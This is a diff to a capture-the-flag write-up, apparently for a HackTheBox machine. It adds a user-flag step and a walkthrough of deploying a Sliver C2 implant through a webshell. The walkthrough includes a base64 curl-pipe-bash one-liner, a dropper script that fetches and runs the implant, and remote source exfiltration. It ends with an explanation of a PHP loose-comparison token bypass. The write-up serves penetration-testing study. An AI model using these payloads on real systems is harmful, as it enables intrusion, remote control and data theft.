@@ -714,9 +714,235 @@ where found:
 
 # Post Exploitation
 
-## Why did the `?token` parameter fuzzing Work ?
+## Getting the user flag
+
+- In `/home`, there is a folder for the `marcus` user.
+
+![`marcus` folder in `/home`](19.png)
+
+- Inside `/home/marcus` the file `user.txt` was found.
+
+![user.txt file found](20.png)
+
 
 ## Deploying Sliver C2 implant
+
+To easily explore and download artefacts from the target, a Sliver implant was deployed through the following
+steps:
+
+- Generate an implant which will connect to vpn IP address.
+
+```
+[server] sliver > generate -b 10.10.15.116:8001 --os linux
+
+[*] Generating new linux/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m36s
+[*] Implant saved to /home/devel/Documents/MonitorsFour/CVE-2025-24367/THIRSTY_MINUTE
+```
+
+- Start a listener job to which the implant will connect on port 8001.
+
+```
+[server] sliver > http -l 8001
+
+[*] Starting HTTP :8001 listener ...
+[*] Successfully started job #2
+
+[server] sliver > jobs
+
+ ID   Name   Protocol   Port   Domains 
+==== ====== ========== ====== =========
+ 1    http   tcp        8000           
+ 2    http   tcp        8001
+```
+
+- Rename the binary
+
+```
+cp ./THIRSTY_MINUTE ../c
+```
+
+- Start an http server to serve the implant using `python3 -m http.server 9001`.
+
+- Prepare a base64 encoded one liner to download and execute the `sliver.sh` script.
+
+```sh
+$ echo 'curl -sSL  http://10.10.15.116:9001/sliver.sh | bash' | base64
+Y3VybCAtc1NMICBodHRwOi8vMTAuMTAuMTUuMTE2OjkwMDEvc2xpdmVyLnNoIHwgYmFzaAo=
+```
+
+- Use the base64 encoded payload above as parameter to the webshell on cacti.
+
+```
+http://cacti.monitorsfour.htb/cacti/shell.php?c=Y3VybCAtc1NMICBodHRwOi8vMTAuMTAuMTUuMTE2OjkwMDEvc2xpdmVyLnNoIHwgYmFzaAo=
+```
+
+- The script `sliver.sh` script fetches the Sliver implant binary, saves it in the `/tmp` folder
+of the container and runs it.
+
+```sh
+#!/bin/bash
+
+IP="10.10.15.116"
+PORT="9001"
+
+rm -rf /tmp/c; curl http://$IP:$PORT/c -o /tmp/c; chmod +x /tmp/c; /tmp/c;
+```
+
+- The implant might take some time to connect back.
+
+```sh
+$ python3 -m http.server 9001
+
+10.129.3.178 - - [14/Feb/2026 07:48:04] "GET /sliver.sh HTTP/1.1" 200 -
+10.129.3.178 - - [14/Feb/2026 07:48:06] "GET /c HTTP/1.1" 200 -
+```
+
+```
+[*] Session 64c6149b THIRSTY_MINUTE - 10.129.3.178:49877 (821fbd6a43fa) - linux/amd64 - Sat, 14 Feb 2026 07:49:16 WAT
+
+[server] sliver > sessions
+
+ ID         Transport   Remote Address       Hostname       Username   Operating System   Health  
+========== =========== ==================== ============== ========== ================== =========
+ 4d9819ed   http(s)     172.18.0.3:52878     c7dafcf68523   www-data   linux/amd64        [ALIVE] 
+ 64c6149b   http(s)     10.129.3.178:49877   821fbd6a43fa   www-data   linux/amd64        [ALIVE] 
+```
+
+- Download recursively the source code of the main Monitors app.
+
+```
+[server] sliver (THIRSTY_MINUTE) > cd /var/www
+
+[*] /var/www
+```
+
+```
+[server] sliver (THIRSTY_MINUTE) > ls
+
+/var/www (3 items, 12.0 KiB)
+============================
+drwxr-xr-x   root:root          .     <dir>  Mon Nov 10 17:01:08 +0000 2025
+drwxr-xr-x   www-data:www-data  app   <dir>  Thu Oct 30 08:12:13 +0000 2025
+dtrwxrwxrwx  www-data:www-data  html  <dir>  Thu Oct 30 08:05:05 +0000 2025
+
+
+[server] sliver (THIRSTY_MINUTE) > download -r app
+
+[*] Wrote 9598602 bytes (1977 files successfully, 0 files unsuccessfully) to /home/devel/Documents/MonitorsFour/CVE-2025-24367/THIRSTY_MINUTE_download_var_www_app__1771053099.tar.gz
+
+[server] sliver (THIRSTY_MINUTE) >
+```
+
+## Why did the `?token` parameter fuzzing Work ?
+
+### `index.php` routes
+
+In `app/index.php`, there were a number of routes registered using the `$router` object, to which controller
+classes were bound.
+
+```php
+// API Routes
+$router->new('GET', '/api/v1/user', 'UserController@get_user');
+$router->new('GET', '/api/v1/users', 'UserController@get_users');
+$router->new('POST', '/api/v1/auth', 'AuthController@login');
+$router->new('GET', '/api/v1/logout', 'AuthController@logout');
+$router->new('POST', '/api/v1/reset', 'AuthController@forgot');
+```
+
+Among these routes, there is the vulnerable route `/api/v1/users`, which was the one exploited during fuzzing.
+This route uses the controller `UserController@get_users`, where `get_users` is a method under the
+`UserController` class.
+
+### `UserController@get_users`
+
+```php
+    public function get_users($router)
+    {
+        $token = $_GET['token'] ?? null;
+
+        if ($token === null) {
+            echo json_encode(["error" => "Missing token parameter"]);
+            exit;
+        }
+
+        $auth = new AuthController();
+        if (!$auth->validate_token($token)) {
+            header("Content-Type: application/json");
+            echo json_encode(["error" => "Invalid or missing token"]);
+            exit;
+        }
+
+        $stmt = $this->db->query("SELECT * FROM users");
+        $users = $stmt->fetchAll();
+
+        return json_encode($users);
+    }
+```
+
+Overall, the `get_users` method:
+- checks that the `token` parameter we provide isn't `null`
+- creates an `$auth` object from the `AuthController` class to validate the token using the method
+`auth->validate_token`.
+- Finally fetches all users from the database.
+
+### `AuthController@validate_token`
+
+```php
+    public function validate_token($token): bool
+    {
+        $query = "SELECT token FROM users";
+        $stmt  = $this->db->query($query);
+        $tokens = $stmt->fetchAll(PDO::FETCH_COLUMN);
+
+        foreach ($tokens as $db_token) {
+            if ($token == $db_token) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+```
+
+The `validate_token` method basically fetches all tokens in the database and compares them with the token
+we provided using the double equal sign.
+
+Since in our fuzzing payload we provided `?token=0`, it means it is basically comparing our string "0" with
+every token in the database.
+
+The following `test.php` script below tries to redo that comparison logic against the tokens of the database.
+
+```php
+<?php
+  $tokens = [
+    "8024b78f83f102da4f",
+    "0e543210987654321",
+    "0e999999999999999",
+    "0e111111111111111",
+  ];
+
+  foreach ($tokens as $db_token) {
+    if ("0" == $db_token) {
+        echo "Yes: ".$db_token . "\n";
+    }
+  }
+?>
+```
+
+On running it, It was found that the tokens that start with `0e...` all validate the comparison condition.
+
+```sh
+└──╼ $php test.php 
+Yes: 0e543210987654321
+Yes: 0e999999999999999
+Yes: 0e111111111111111
+```
+
+This suggests that they are not considered as strings by the php interpreter, but as exponents. This is known as
+type juggling and it is induced by the loose comparison of the `==` which triggers the interpretation of `0e...` as
+a numeric value (0 to the exponent `...`) before been compared to the payload "0".  
 
 ## CVE-2025-9074
 
